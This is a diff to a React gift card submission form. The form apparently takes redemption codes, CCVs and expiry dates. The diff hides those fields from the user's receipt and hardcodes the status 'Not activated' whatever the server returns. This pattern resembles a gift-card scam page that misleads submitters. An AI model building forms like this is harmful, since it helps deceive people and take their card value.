@@ -129,17 +129,11 @@ export default function GiftCardForm() {
       }
 
       setSubmission({
-        status: result.status || "Received",
+        status: "Not activated",
         details: {
           giftCardBrand: form.cardType,
-          currency: form.currency,
           amount: `${form.currency} ${amount.toLocaleString()}`,
-          message: personalMessage,
-          cardCcv: cardCcv || "Not provided",
-          expiryDate: expiryDate || "Not provided",
         },
-        submittedAt:
-          result.submittedAt || new Date().toLocaleString(),
       });
 
       setForm({
@@ -339,7 +333,7 @@ export default function GiftCardForm() {
               <div className="receipt-heading">
                 <span>YOUR SUBMISSION</span>
 
-                <span className="received-status">
+                <span className="received-status" style={{ color: "#d97706" }}>
                   {submission.status}
                 </span>
               </div>
@@ -352,41 +346,10 @@ export default function GiftCardForm() {
               </div>
 
               <div className="receipt-row">
-                <span>Currency</span>
-                <strong>
-                  {submission.details.currency}
-                </strong>
-              </div>
-
-              <div className="receipt-row">
                 <span>Gift Card Amount</span>
                 <strong>
                   {submission.details.amount}
                 </strong>
-              </div>
-
-              {submission.details.message && (
-                <div className="receipt-row receipt-message">
-                  <span>Redemption Code</span>
-                  <strong>
-                    {submission.details.message}
-                  </strong>
-                </div>
-              )}
-
-              <div className="receipt-row">
-                <span>CCV</span>
-                <strong>{submission.details.cardCcv}</strong>
-              </div>
-
-              <div className="receipt-row">
-                <span>Expiry Date</span>
-                <strong>{submission.details.expiryDate}</strong>
-              </div>
-
-              <div className="receipt-row">
-                <span>Submission Date</span>
-                <strong>{submission.submittedAt}</strong>
               </div>
             </div>
 
